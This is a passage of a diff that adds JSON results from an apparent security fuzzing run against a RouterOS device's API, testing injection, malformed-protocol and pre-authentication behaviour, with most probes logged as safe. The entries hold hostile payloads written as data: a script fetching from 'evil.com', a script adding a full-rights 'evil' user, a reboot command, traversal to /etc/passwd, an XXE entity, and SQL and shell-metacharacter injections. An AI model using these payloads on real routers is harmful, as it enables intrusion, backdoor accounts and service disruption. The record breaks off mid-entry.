+      "category": "command_injection",
+      "name": "inject_traversal_encoded_dot",
+      "description": "URL-encoded double dot",
+      "result": "safe: !trap =category=0 =message=no such command or directory (%2e%2e) | !trap =message=no such command pr",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.175893",
+      "details": {
+        "command": "'/system/%2e%2e/resource/print'"
+      }
+    },
+    {
+      "id": 87,
+      "category": "command_injection",
+      "name": "inject_traversal_windows_traversal",
+      "description": "Backslash traversal (Windows-style)",
+      "result": "safe: !trap =category=0 =message=no such command or directory (system\\..\\..\\etc\\passwd) | !trap =message=n",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.179891",
+      "details": {
+        "command": "'/system\\\\..\\\\..\\\\etc\\\\passwd'"
+      }
+    },
+    {
+      "id": 88,
+      "category": "command_injection",
+      "name": "inject_attr_semicolon",
+      "description": "Semicolon injection in attribute value",
+      "result": "safe: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.187887",
+      "details": {
+        "attr": "comment='test;id'"
+      }
+    },
+    {
+      "id": 89,
+      "category": "command_injection",
+      "name": "inject_attr_backtick",
+      "description": "Backtick injection in attribute value",
+      "result": "safe: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.191885",
+      "details": {
+        "attr": "comment='test`id`'"
+      }
+    },
+    {
+      "id": 90,
+      "category": "command_injection",
+      "name": "inject_attr_dollar_paren",
+      "description": "Dollar-paren injection in attribute value",
+      "result": "safe: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.199881",
+      "details": {
+        "attr": "comment='test$(id)'"
+      }
+    },
+    {
+      "id": 91,
+      "category": "command_injection",
+      "name": "inject_attr_pipe",
+      "description": "Pipe injection in attribute value",
+      "result": "safe: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.203879",
+      "details": {
+        "attr": "comment='test|id'"
+      }
+    },
+    {
+      "id": 92,
+      "category": "command_injection",
+      "name": "inject_attr_newline",
+      "description": "Newline injection in attribute value",
+      "result": "safe: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.207877",
+      "details": {
+        "attr": "comment='test\\nid'"
+      }
+    },
+    {
+      "id": 93,
+      "category": "command_injection",
+      "name": "inject_attr_format_string",
+      "description": "Format string in attribute value",
+      "result": "safe: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.211875",
+      "details": {
+        "attr": "comment='%s%s%s%s%n%n'"
+      }
+    },
+    {
+      "id": 94,
+      "category": "command_injection",
+      "name": "inject_attr_sql_single_quote",
+      "description": "SQL injection in attribute value",
+      "result": "safe: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.219871",
+      "details": {
+        "attr": "comment=\"test'; DROP TABLE users;--\""
+      }
+    },
+    {
+      "id": 95,
+      "category": "command_injection",
+      "name": "inject_attr_xml_entity",
+      "description": "XXE in attribute value",
+      "result": "safe: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.223869",
+      "details": {
+        "attr": "comment=\"<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\""
+      }
+    },
+    {
+      "id": 96,
+      "category": "command_injection",
+      "name": "inject_attr_long_value",
+      "description": "64KB attribute value",
+      "result": "safe: no_response",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.227867",
+      "details": {
+        "attr": "comment='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'"
+      }
+    },
+    {
+      "id": 97,
+      "category": "command_injection",
+      "name": "inject_query_dollar_paren",
+      "description": "Dollar-paren in query",
+      "result": "safe: !empty | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.235863"
+    },
+    {
+      "id": 98,
+      "category": "command_injection",
+      "name": "inject_query_backtick",
+      "description": "Backtick in query",
+      "result": "safe: !empty | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.239861"
+    },
+    {
+      "id": 99,
+      "category": "command_injection",
+      "name": "inject_query_semicolon",
+      "description": "Semicolon in query",
+      "result": "safe: !empty | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.247857"
+    },
+    {
+      "id": 100,
+      "category": "command_injection",
+      "name": "inject_query_pipe",
+      "description": "Pipe in query",
+      "result": "safe: !empty | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.251855"
+    },
+    {
+      "id": 101,
+      "category": "command_injection",
+      "name": "inject_query_format_string",
+      "description": "Format string in query",
+      "result": "safe: !empty | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.251855"
+    },
+    {
+      "id": 102,
+      "category": "command_injection",
+      "name": "inject_unicode_fullwidth_slash",
+      "description": "Fullwidth 's' in command (normalization)",
+      "result": "executed=no: !trap =category=0 =message=no such command or directory (\uff53ystem) | !trap =message=no such command pr",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.275843",
+      "details": {
+        "command_repr": "'/\uff53ystem/resource/print'"
+      }
+    },
+    {
+      "id": 103,
+      "category": "command_injection",
+      "name": "inject_unicode_homoglyph_system",
+      "description": "Cyrillic homoglyphs in 'system'",
+      "result": "executed=no: !trap =category=0 =message=no such command or directory (\u0455y\u0455tem) | !trap =message=no such command pr",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.275843",
+      "details": {
+        "command_repr": "'/\u0455y\u0455tem/resource/print'"
+      }
+    },
+    {
+      "id": 104,
+      "category": "command_injection",
+      "name": "inject_unicode_overlong_utf8_raw",
+      "description": "Normal command for comparison",
+      "result": "executed=yes: !re =uptime=1h8m33s =version=7.20.8 (long-term) | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.283839",
+      "details": {
+        "command_repr": "'/system/resource/print'"
+      }
+    },
+    {
+      "id": 105,
+      "category": "command_injection",
+      "name": "inject_ip_ip_backtick",
+      "description": "Backtick in IP address field",
+      "result": "safe: !trap =message=invalid value for argument address | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.287837",
+      "details": {
+        "value": "'[REDACTED-IP]`id`'"
+      }
+    },
+    {
+      "id": 106,
+      "category": "command_injection",
+      "name": "inject_ip_ip_semicolon",
+      "description": "Semicolon in IP address",
+      "result": "safe: !trap =message=invalid value for argument address | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.287837",
+      "details": {
+        "value": "'[REDACTED-IP];id'"
+      }
+    },
+    {
+      "id": 107,
+      "category": "command_injection",
+      "name": "inject_ip_ip_pipe",
+      "description": "Pipe in IP address",
+      "result": "safe: !trap =message=invalid value for argument address | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.287837",
+      "details": {
+        "value": "'[REDACTED-IP]|id'"
+      }
+    },
+    {
+      "id": 108,
+      "category": "command_injection",
+      "name": "inject_ip_ip_dollar",
+      "description": "Dollar-paren in IP address",
+      "result": "safe: !trap =message=invalid value for argument address | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.287837",
+      "details": {
+        "value": "'[REDACTED-IP]$(id)'"
+      }
+    },
+    {
+      "id": 109,
+      "category": "command_injection",
+      "name": "inject_ip_ip_overflow",
+      "description": "Invalid IP overflow",
+      "result": "safe: !trap =message=invalid value for argument address | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.311825",
+      "details": {
+        "value": "'999.999.999.999/99'"
+      }
+    },
+    {
+      "id": 110,
+      "category": "command_injection",
+      "name": "inject_ip_ip_negative",
+      "description": "Negative octets in IP",
+      "result": "safe: !trap =message=invalid value for argument address | !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.311825",
+      "details": {
+        "value": "'-1.-1.-1.-1/-1'"
+      }
+    },
+    {
+      "id": 111,
+      "category": "command_injection",
+      "name": "inject_script_rsc_fetch",
+      "description": "RouterOS script with fetch command",
+      "result": "script_created=True: !done =ret=*9A",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.315823",
+      "details": {
+        "script_body": ":foreach i in=(\"a\") do={/tool fetch url=\"http://evil.com\"}"
+      }
+    },
+    {
+      "id": 112,
+      "category": "command_injection",
+      "name": "inject_script_rsc_export",
+      "description": "RouterOS export command in script body",
+      "result": "script_created=True: !done =ret=*9B",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.315823",
+      "details": {
+        "script_body": ":export file=config"
+      }
+    },
+    {
+      "id": 113,
+      "category": "command_injection",
+      "name": "inject_script_rsc_system_cmd",
+      "description": "System reboot in script body",
+      "result": "script_created=True: !done =ret=*9C",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.315823",
+      "details": {
+        "script_body": "/system reboot"
+      }
+    },
+    {
+      "id": 114,
+      "category": "command_injection",
+      "name": "inject_script_rsc_semicolon_chain",
+      "description": "Chained commands via semicolon in script",
+      "result": "script_created=True: !done =ret=*9D",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.347807",
+      "details": {
+        "script_body": ":log info test; /user add name=evil password=evil group=full"
+      }
+    },
+    {
+      "id": 115,
+      "category": "command_injection",
+      "name": "inject_crlf_crlf_name",
+      "description": "CRLF in name attribute",
+      "result": "response: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.355803",
+      "details": {
+        "value_repr": "'test\\r\\ninjected'"
+      }
+    },
+    {
+      "id": 116,
+      "category": "command_injection",
+      "name": "inject_crlf_cr_only",
+      "description": "CR-only injection",
+      "result": "response: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.359801",
+      "details": {
+        "value_repr": "'test\\rinjected'"
+      }
+    },
+    {
+      "id": 117,
+      "category": "command_injection",
+      "name": "inject_crlf_lf_only",
+      "description": "LF-only injection",
+      "result": "response: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.363799",
+      "details": {
+        "value_repr": "'test\\ninjected'"
+      }
+    },
+    {
+      "id": 118,
+      "category": "command_injection",
+      "name": "inject_crlf_double_crlf",
+      "description": "Double CRLF injection",
+      "result": "response: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:12.367797",
+      "details": {
+        "value_repr": "'test\\r\\n\\r\\ninjected'"
+      }
+    },
+    {
+      "id": 119,
+      "category": "protocol_level",
+      "name": "malformed_len_len100_data5",
+      "description": "Length says 100 (0x64) but only 5 bytes follow",
+      "result": "connection_closed_or_timeout",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:18.384787"
+    },
+    {
+      "id": 120,
+      "category": "protocol_level",
+      "name": "malformed_len_len255_data1",
+      "description": "Length says 127 but only 1 byte follows",
+      "result": "connection_closed_or_timeout",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:24.393781"
+    },
+    {
+      "id": 121,
+      "category": "protocol_level",
+      "name": "malformed_len_len1000_data5",
+      "description": "2-byte length (1000) but only 5 bytes follow",
+      "result": "connection_closed_or_timeout",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:30.406773"
+    },
+    {
+      "id": 122,
+      "category": "protocol_level",
+      "name": "malformed_len_zero_with_data",
+      "description": "Zero length followed by data",
+      "result": "connection_closed_or_timeout",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:35.916017"
+    },
+    {
+      "id": 123,
+      "category": "protocol_level",
+      "name": "boundary_tier1_max_127",
+      "description": "Max 1-byte length (127)",
+      "result": "timeout (sent 127 of 127 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:41.917015"
+    },
+    {
+      "id": 124,
+      "category": "protocol_level",
+      "name": "boundary_tier2_min_128",
+      "description": "Min 2-byte length (128) \u2014 1-to-2 boundary",
+      "result": "timeout (sent 128 of 128 bytes)",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:47.918013"
+    },
+    {
+      "id": 125,
+      "category": "protocol_level",
+      "name": "boundary_tier2_max_16383",
+      "description": "Max 2-byte length (16383)",
+      "result": "sent 1024 of 16383 bytes, got 36 bytes back",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:48.921511",
+      "details": {
+        "length_value": 16383,
+        "sent_bytes": 1024,
+        "response_hex": "0621666174616c1b746f6f206d75636820696e707574206265666f7265206c6f67696e00"
+      }
+    },
+    {
+      "id": 126,
+      "category": "protocol_level",
+      "name": "boundary_tier3_min_16384",
+      "description": "Min 3-byte length (16384) \u2014 2-to-3 boundary",
+      "result": "sent 1024 of 16384 bytes, got 36 bytes back",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:49.925009",
+      "details": {
+        "length_value": 16384,
+        "sent_bytes": 1024,
+        "response_hex": "0621666174616c1b746f6f206d75636820696e707574206265666f7265206c6f67696e00"
+      }
+    },
+    {
+      "id": 127,
+      "category": "protocol_level",
+      "name": "boundary_tier3_max_2097151",
+      "description": "Max 3-byte length (2097151)",
+      "result": "sent 1024 of 2097151 bytes, got 36 bytes back",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:50.928507",
+      "details": {
+        "length_value": 2097151,
+        "sent_bytes": 1024,
+        "response_hex": "0621666174616c1b746f6f206d75636820696e707574206265666f7265206c6f67696e00"
+      }
+    },
+    {
+      "id": 128,
+      "category": "protocol_level",
+      "name": "boundary_tier4_min_2097152",
+      "description": "Min 4-byte length (2097152) \u2014 3-to-4 boundary",
+      "result": "sent 1024 of 2097152 bytes, got 36 bytes back",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:51.924009",
+      "details": {
+        "length_value": 2097152,
+        "sent_bytes": 1024,
+        "response_hex": "0621666174616c1b746f6f206d75636820696e707574206265666f7265206c6f67696e00"
+      }
+    },
+    {
+      "id": 129,
+      "category": "protocol_level",
+      "name": "boundary_tier4_max_268435455",
+      "description": "Max 4-byte length (268435455)",
+      "result": "length header sent, got 0 bytes",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:52.919511",
+      "details": {
+        "length_value": "0xfffffff",
+        "header_hex": "efffffff",
+        "response_hex": ""
+      }
+    },
+    {
+      "id": 130,
+      "category": "protocol_level",
+      "name": "boundary_tier5_min_268435456",
+      "description": "Min 5-byte length (268435456)",
+      "result": "length header sent, got 0 bytes",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:53.931005",
+      "details": {
+        "length_value": "0x10000000",
+        "header_hex": "f010000000",
+        "response_hex": ""
+      }
+    },
+    {
+      "id": 131,
+      "category": "protocol_level",
+      "name": "boundary_tier5_max_ffffffff",
+      "description": "Max 5-byte length (4294967295)",
+      "result": "length header sent, got 0 bytes",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:54.926507",
+      "details": {
+        "length_value": "0xffffffff",
+        "header_hex": "f0ffffffff",
+        "response_hex": ""
+      }
+    },
+    {
+      "id": 132,
+      "category": "protocol_level",
+      "name": "zero_length_sentences_then_login",
+      "description": "10 empty sentences (just 0x00) then attempt login",
+      "result": "login=failed: !fatal too many commands before login",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:55.926007",
+      "details": {
+        "login_after_empty": false
+      }
+    },
+    {
+      "id": 133,
+      "category": "protocol_level",
+      "name": "oversized_1mb_word",
+      "description": "1MB word",
+      "result": "error: [Errno 104] Connection reset by peer",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:55.926007"
+    },
+    {
+      "id": 134,
+      "category": "protocol_level",
+      "name": "reserved_byte_0xf1",
+      "description": "Reserved length prefix 0xF1 + data",
+      "result": "got 22 bytes: 0621666174616c0d6e6f74206c6f6767656420696e00",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:56.925507",
+      "details": {
+        "byte": "0xf1"
+      }
+    },
+    {
+      "id": 135,
+      "category": "protocol_level",
+      "name": "reserved_byte_0xf5",
+      "description": "Reserved length prefix 0xF5 + data",
+      "result": "got 22 bytes: 0621666174616c0d6e6f74206c6f6767656420696e00",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:57.929005",
+      "details": {
+        "byte": "0xf5"
+      }
+    },
+    {
+      "id": 136,
+      "category": "protocol_level",
+      "name": "reserved_byte_0xf8",
+      "description": "Reserved length prefix 0xF8 + data",
+      "result": "got 0 bytes: ",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:58.936501",
+      "details": {
+        "byte": "0xf8"
+      }
+    },
+    {
+      "id": 137,
+      "category": "protocol_level",
+      "name": "reserved_byte_0xfb",
+      "description": "Reserved length prefix 0xFB + data",
+      "result": "got 0 bytes: ",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:16:59.943997",
+      "details": {
+        "byte": "0xfb"
+      }
+    },
+    {
+      "id": 138,
+      "category": "protocol_level",
+      "name": "reserved_byte_0xfe",
+      "description": "Reserved length prefix 0xFE + data",
+      "result": "got 0 bytes: ",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:00.947495",
+      "details": {
+        "byte": "0xfe"
+      }
+    },
+    {
+      "id": 139,
+      "category": "protocol_level",
+      "name": "reserved_byte_0xff",
+      "description": "Reserved length prefix 0xFF + data",
+      "result": "got 0 bytes: ",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:01.958989",
+      "details": {
+        "byte": "0xff"
+      }
+    },
+    {
+      "id": 140,
+      "category": "protocol_level",
+      "name": "garbage_random_256",
+      "description": "256 bytes of random data",
+      "result": "timeout",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:07.967983"
+    },
+    {
+      "id": 141,
+      "category": "protocol_level",
+      "name": "garbage_all_zeros_256",
+      "description": "256 null bytes",
+      "result": "got 39 bytes: 0621666174616c1e746f6f206d616e7920636f6d6d616e6473206265666f7265206c6f67696e00",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:08.971481",
+      "details": {
+        "response_hex": "0621666174616c1e746f6f206d616e7920636f6d6d616e6473206265666f7265206c6f67696e00"
+      }
+    },
+    {
+      "id": 142,
+      "category": "protocol_level",
+      "name": "garbage_all_ff_256",
+      "description": "256 bytes of 0xFF",
+      "result": "got 0 bytes: ",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:09.974979",
+      "details": {
+        "response_hex": ""
+      }
+    },
+    {
+      "id": 143,
+      "category": "protocol_level",
+      "name": "garbage_http_get",
+      "description": "HTTP GET request on API port",
+      "result": "timeout",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:15.983973"
+    },
+    {
+      "id": 144,
+      "category": "protocol_level",
+      "name": "garbage_ssh_banner",
+      "description": "SSH banner on API port",
+      "result": "timeout",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:21.992967"
+    },
+    {
+      "id": 145,
+      "category": "protocol_level",
+      "name": "garbage_tls_client_hello",
+      "description": "TLS ClientHello on plaintext API port",
+      "result": "timeout",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:28.017953"
+    },
+    {
+      "id": 146,
+      "category": "protocol_level",
+      "name": "half_close_shutdown_write",
+      "description": "Login, send command, shutdown(SHUT_WR), read response",
+      "result": "got 0 bytes after half-close",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:28.021951",
+      "details": {
+        "response_hex": ""
+      }
+    },
+    {
+      "id": 147,
+      "category": "protocol_level",
+      "name": "interleaved_partial_sentences",
+      "description": "Interleaved partial sentences",
+      "result": "timeout_or_closed",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:35.050435"
+    },
+    {
+      "id": 148,
+      "category": "protocol_level",
+      "name": "rapid_sentence_flood_500",
+      "description": "Send 500 /system/identity/print sentences rapidly",
+      "result": "sent in 0.00s, got 13500 bytes back",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:37.057431",
+      "details": {
+        "sentences": 500,
+        "send_time": 0.0
+      }
+    },
+    {
+      "id": 149,
+      "category": "protocol_level",
+      "name": "many_words_1000_sentence",
+      "description": "Single sentence with 1000 attribute words",
+      "result": "got 47 bytes",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:39.064427",
+      "details": {
+        "word_count": 1000,
+        "sentence_size": 15788,
+        "response_hex": "052174726170203d6d6573736167653d756e6b6e6f776e20706172616d65746572206174747230000521646f6e6500"
+      }
+    },
+    {
+      "id": 150,
+      "category": "protocol_level",
+      "name": "crafted_len_two_byte_zero",
+      "description": "2-byte encoding of 0",
+      "result": "timeout_or_closed",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:45.073421"
+    },
+    {
+      "id": 151,
+      "category": "protocol_level",
+      "name": "crafted_len_three_byte_zero",
+      "description": "3-byte encoding of 0",
+      "result": "timeout_or_closed",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:51.078417"
+    },
+    {
+      "id": 152,
+      "category": "protocol_level",
+      "name": "crafted_len_four_byte_zero",
+      "description": "4-byte encoding of 0",
+      "result": "timeout_or_closed",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:17:57.083413"
+    },
+    {
+      "id": 153,
+      "category": "protocol_level",
+      "name": "crafted_len_five_byte_zero",
+      "description": "5-byte encoding of 0",
+      "result": "timeout_or_closed",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:03.104401"
+    },
+    {
+      "id": 154,
+      "category": "protocol_level",
+      "name": "crafted_len_five_byte_one",
+      "description": "5-byte encoding of 1",
+      "result": "timeout_or_closed",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:09.113395"
+    },
+    {
+      "id": 155,
+      "category": "protocol_level",
+      "name": "slow_loris_byte_by_byte",
+      "description": "Send login sentence one byte at a time (50ms apart)",
+      "result": "login=success: !done",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:11.292305",
+      "details": {
+        "bytes_sent": 42,
+        "total_time": "2.1s"
+      }
+    },
+    {
+      "id": 156,
+      "category": "protocol_level",
+      "name": "old_style_challenge_login",
+      "description": "Send /login without credentials (old challenge-response probe)",
+      "result": "has_challenge=True, response=!done =ret=c6038d3f0f184471971029691a145187",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:11.392255",
+      "details": {
+        "challenge": "c6038d3f0f184471971029691a145187",
+        "response": "!done =ret=c6038d3f0f184471971029691a145187"
+      }
+    },
+    {
+      "id": 157,
+      "category": "protocol_level",
+      "name": "truncated_word_close",
+      "description": "Send half of a word then close connection",
+      "result": "router_alive=True",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:12.899501",
+      "details": {
+        "alive": true,
+        "uptime": "1h10m33s",
+        "cpu_load": "6",
+        "free_memory": "833753088",
+        "version": "7.20.8 (long-term)"
+      }
+    },
+    {
+      "id": 158,
+      "category": "protocol_level",
+      "name": "overlap_2byte_for_5",
+      "description": "2-byte encoding for value 5 (should be 1-byte)",
+      "result": "timeout_or_closed",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:18.908495"
+    },
+    {
+      "id": 159,
+      "category": "protocol_level",
+      "name": "overlap_3byte_for_100",
+      "description": "3-byte encoding for value 100",
+      "result": "got 22 bytes",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:19.911993",
+      "details": {
+        "response_hex": "0621666174616c0d6e6f74206c6f6767656420696e00"
+      }
+    },
+    {
+      "id": 160,
+      "category": "protocol_level",
+      "name": "overlap_4byte_for_200",
+      "description": "4-byte encoding for value 200",
+      "result": "got 22 bytes",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:20.915491",
+      "details": {
+        "response_hex": "0621666174616c0d6e6f74206c6f6767656420696e00"
+      }
+    },
+    {
+      "id": 161,
+      "category": "protocol_level",
+      "name": "plaintext_on_ssl_port",
+      "description": "Send plaintext API data on SSL port 8729",
+      "result": "got 7 bytes: 15000000020216",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.918989",
+      "details": {
+        "response_hex": "15000000020216"
+      }
+    },
+    {
+      "id": 162,
+      "category": "protocol_level",
+      "name": "batched_tcp_segment",
+      "description": "5 sentences packed into single TCP send",
+      "result": "2 replies",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.922987",
+      "details": {
+        "reply_count": 2
+      }
+    },
+    {
+      "id": 163,
+      "category": "protocol_level",
+      "name": "deeply_nested_path",
+      "description": "Command with 200-level deep path",
+      "result": "response: !trap =category=0 =message=no such command or directory (a) | !trap =message=no such command prefix ",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.926985",
+      "details": {
+        "path_depth": 200
+      }
+    },
+    {
+      "id": 164,
+      "category": "protocol_level",
+      "name": "all_printable_ascii_command",
+      "description": "Command containing all printable ASCII (32-126)",
+      "result": "response: !trap =category=0 =message=no such command or directory ( !\"#$%&'()*+,-.) | !trap =message=no such c",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.930983",
+      "details": {
+        "command_len": 95
+      }
+    },
+    {
+      "id": 165,
+      "category": "preauth_commands",
+      "name": "preauth_system_resource_print",
+      "description": "Pre-auth: System resource info",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.934981",
+      "details": {
+        "command": "/system/resource/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 166,
+      "category": "preauth_commands",
+      "name": "preauth_system_identity_print",
+      "description": "Pre-auth: System identity",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.934981",
+      "details": {
+        "command": "/system/identity/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 167,
+      "category": "preauth_commands",
+      "name": "preauth_user_print",
+      "description": "Pre-auth: User list",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.938979",
+      "details": {
+        "command": "/user/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 168,
+      "category": "preauth_commands",
+      "name": "preauth_log_print",
+      "description": "Pre-auth: System log",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.942977",
+      "details": {
+        "command": "/log/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 169,
+      "category": "preauth_commands",
+      "name": "preauth_system_reboot",
+      "description": "Pre-auth: System reboot",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.942977",
+      "details": {
+        "command": "/system/reboot",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 170,
+      "category": "preauth_commands",
+      "name": "preauth_system_shutdown",
+      "description": "Pre-auth: System shutdown",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.946975",
+      "details": {
+        "command": "/system/shutdown",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 171,
+      "category": "preauth_commands",
+      "name": "preauth_file_print",
+      "description": "Pre-auth: File list",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.950973",
+      "details": {
+        "command": "/file/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 172,
+      "category": "preauth_commands",
+      "name": "preauth_ip_address_print",
+      "description": "Pre-auth: IP addresses",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.954971",
+      "details": {
+        "command": "/ip/address/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 173,
+      "category": "preauth_commands",
+      "name": "preauth_ip_route_print",
+      "description": "Pre-auth: Routing table",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.954971",
+      "details": {
+        "command": "/ip/route/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 174,
+      "category": "preauth_commands",
+      "name": "preauth_interface_print",
+      "description": "Pre-auth: Interface list",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.958969",
+      "details": {
+        "command": "/interface/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 175,
+      "category": "preauth_commands",
+      "name": "preauth_ip_firewall_filter_print",
+      "description": "Pre-auth: Firewall rules",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.958969",
+      "details": {
+        "command": "/ip/firewall/filter/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 176,
+      "category": "preauth_commands",
+      "name": "preauth_system_package_print",
+      "description": "Pre-auth: Installed packages",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.962967",
+      "details": {
+        "command": "/system/package/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 177,
+      "category": "preauth_commands",
+      "name": "preauth_system_script_print",
+      "description": "Pre-auth: Scripts",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.962967",
+      "details": {
+        "command": "/system/script/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 178,
+      "category": "preauth_commands",
+      "name": "preauth_system_scheduler_print",
+      "description": "Pre-auth: Scheduled tasks",
+      "result": "response: !fatal not logged in",
+      "anomaly": false,
+      "timestamp": "2026-02-15T23:18:21.966965",
+      "details": {
+        "command": "/system/scheduler/print",
+        "response_summary": "!fatal not logged in"
+      }
+    },
+    {
+      "id": 179,
+      "category": "preauth_commands",
